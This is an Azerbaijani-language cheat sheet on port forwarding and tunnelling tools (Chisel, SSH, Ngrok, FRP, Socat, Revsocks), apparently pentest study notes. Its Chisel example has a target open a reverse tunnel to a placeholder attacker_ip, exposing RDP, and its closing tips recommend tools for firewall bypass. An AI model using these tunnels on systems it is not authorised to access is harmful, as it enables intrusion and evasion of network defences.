# 🔥 Port Forwarding və Tunelləşdirmə Metodları

Bu sənəddə **Chisel** və digər port forwarding/tunelləşdirmə metodları haqqında ətraflı məlumat və istifadə nümunələri verilmişdir.

---

## 📌 1. Chisel

**Chisel** açıq mənbəli port forwarding və tunelləşdirmə alətidir. Bu, firewall və NAT məhdudiyyətlərini aşmaq üçün istifadə olunur.

### 🛠 İstifadə nümunəsi:

**Hücumçu (Attacker) Chisel serverini işə salır:**
```bash
chisel server -p 8080 --reverse
```

**Hədəf sistem (Target) Chisel client ilə qoşulur:**
```bash
chisel client attacker_ip:8080 R:9001:127.0.0.1:3389
```
📌 Bu əmrlə **9001 portu üzərindən RDP trafiki yönləndirilir**.

---

## 🚀 2. SSH Tunneling (SSH Port Forwarding)

SSH tunneling, uzaq bir server üzərindən trafik yönləndirmək üçün təhlükəsiz üsuldur.

### 🛠 İstifadə nümunələri:

**Local Port Forwarding:**
```bash
ssh -L 9001:127.0.0.1:3389 user@remote_server
```
📌 **9001 portu vasitəsilə RDP (3389) trafiki yönləndirilir.**

**Remote Port Forwarding:**
```bash
ssh -R 9001:127.0.0.1:22 user@remote_server
```
📌 **Remote server 9001 portundan lokal sistemə SSH edə bilər.**

**SOCKS Proxy (Dynamic Port Forwarding):**
```bash
ssh -D 1080 -N -f user@remote_server
```
📌 **SOCKS5 proxy yaratmaq üçün istifadə edilir.**

---

## 🌍 3. Ngrok

**Ngrok**, lokal hostu internetə açmaq üçün istifadə edilən məşhur xidmətdir.

### 🛠 İstifadə nümunələri:

**HTTP trafik yönləndirmə:**
```bash
ngrok http 80
```
📌 **Lokal hostun 80-ci portu internetə açılır.**

**TCP tunelləşdirmə:**
```bash
ngrok tcp 3389
```
📌 **3389 (RDP) portu üçün tunel yaradılır.**

---

## 🔄 4. FRP (Fast Reverse Proxy)

**FRP**, **Chisel**-ə alternativ olaraq firewall bypass üçün istifadə olunur.

### 🛠 İstifadə nümunəsi:

```bash
frpc -c frpc.ini
```
📌 **frpc.ini faylında istənilən portlar və tunellər təyin edilir.**

---

## 🔧 5. Socat

**Socat**, iki nöqtə arasında şəbəkə bağlantısı yaratmaq üçün istifadə edilir.

### 🛠 İstifadə nümunəsi:

**Lokal portu uzaq hosta yönləndirmək:**
```bash
socat TCP-LISTEN:9001,fork TCP:192.168.1.100:3389
```
📌 **9001 portu gələn trafiki 192.168.1.100 sisteminin 3389 portuna yönləndirir.**

---

## 🎭 6. Revsocks (Reverse SOCKS Proxy)

**Revsocks**, SOCKS5 tunelləşdirmə üçün istifadə olunur.

### 🛠 İstifadə nümunəsi:

```bash
revsocks -s -p 1080
```
📌 **SOCKS5 proxy server yaradılır.**

---

## 📊 Hansı metod daha yaxşıdır?

| Alət/Metod        | Şəbəkə Tipi | Proxy | Trafik Şifrələmə | Əsas Üstünlüklər |
|-------------------|------------|--------|----------------|-----------------|
| **Chisel**       | TCP/UDP    | Bəli   | Bəli           | Sadə və sürətli |
| **SSH Tunneling** | TCP        | Bəli   | Bəli           | Ən etibarlı üsullardan biridir |
| **Ngrok**        | TCP/HTTP   | Xeyr   | Bəli           | Asan istifadəyə malikdir |
| **FRP**          | TCP/UDP    | Bəli   | Bəli           | Geniş konfiqurasiya imkanları |
| **Socat**        | TCP/UDP    | Xeyr   | Xeyr           | Minimal alət, firewall bypass üçün ideal |
| **Revsocks**     | TCP        | Bəli   | Bəli           | SOCKS5 proxy qurmaq üçün |

🔹 **Əgər təhlükəsiz tunel açmaq istəyirsənsə:** SSH Tunneling istifadə et.  
🔹 **Əgər dinamik tunel və ya internetdən giriş istəyirsənsə:** Chisel və ya FRP seç.  
🔹 **Əgər sadə və tez işləyən bir şey istəyirsənsə:** Ngrok yaxşı seçimdir.  
🔹 **Əgər firewall bypass etmək istəyirsənsə:** Socat və ya Revsocks istifadə et.  
